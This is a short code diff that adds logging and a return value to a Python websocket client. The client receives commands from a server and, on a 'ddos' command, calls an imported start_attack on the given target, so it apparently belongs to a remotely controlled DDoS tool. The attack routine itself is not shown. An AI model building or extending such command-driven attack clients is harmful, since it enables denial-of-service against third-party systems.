@@ -1,3 +1,4 @@
+import logging
 import json
 
 from asyncio import Queue
@@ -7,6 +8,9 @@ from sanic.server.websockets.impl import WebsocketImplProtocol
 from scripts.exceptions import CannotGetActionFromServerException
 from scripts.services.attack_services import start_attack
 from pydantic import ValidationError
+
+
+logger = logging.getLogger(__package__)
 
 
 async def get_action_from_server(ws: WebsocketImplProtocol) -> Action:
@@ -39,8 +43,9 @@ async def is_needed_to_stop(action: Action) -> bool:
 
 async def dispatch_action(action: Action):
     if action.command.title == 'ddos':
-        await start_attack(action.target)
-
-
+        logger.info(f"Starting attack on: {action.target}")
+        result = await start_attack(action.target)
+        logger.info(f"Attack stopped on: {action.target}")
+        return result
 
 
